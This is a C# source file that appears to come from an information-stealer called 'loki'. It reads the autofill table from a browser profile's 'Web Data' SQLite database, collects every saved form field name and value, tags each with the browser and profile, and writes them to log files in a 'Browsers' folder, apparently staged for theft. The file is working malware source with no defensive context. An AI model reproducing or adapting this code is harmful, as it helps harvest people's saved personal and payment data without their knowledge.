namespace loki.loki.Stealer.WebData
{
    using System;
    using System.Collections.Generic;
    using System.IO;
    using Stealer.Cookies;

    internal class Get_Browser_Autofill
    {
        public static List<string> Autofill_List = new List<string>();
        public static List<string> Autofill = new List<string>();

        public static int AutofillCount;

        public static void Get_Autofill(string profilePath, string browser_name, string profile_name)
        {
            try
            {
                string text = Path.Combine(profilePath, "Web Data");
                var cNT = new sqlite.CNT(GetCookies.CreateTempCopy(text));
                cNT.ReadTable("autofill");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    AutofillCount++;
                    try
                    {
                        Autofill.Add($"Name : {cNT.ParseValue(i, "name").Trim()}{Environment.NewLine}Value : {cNT.ParseValue(i, "value").Trim()}");
                    }
                    catch { }
                }

                foreach (string v in Autofill)
                {
                    Autofill_List.Add($"Browser : {browser_name}{Environment.NewLine}Profile : {profile_name}{Environment.NewLine}{v}{Environment.NewLine}"); ;
                }
                Autofill.Clear();
            }
            catch { }
        }

        public static void Write_Autofill(string Browser_Name, string Profile_Name)
        {
            using (var streamWriter = new StreamWriter($"{Program.dir}\\Browsers\\{Profile_Name}_{Browser_Name}_Autofill.log"))
            {
                foreach (string v in Autofill_List)
                {
                    streamWriter.Write(v);
                    streamWriter.Write(Environment.NewLine);

                }
            }
        }
    }
}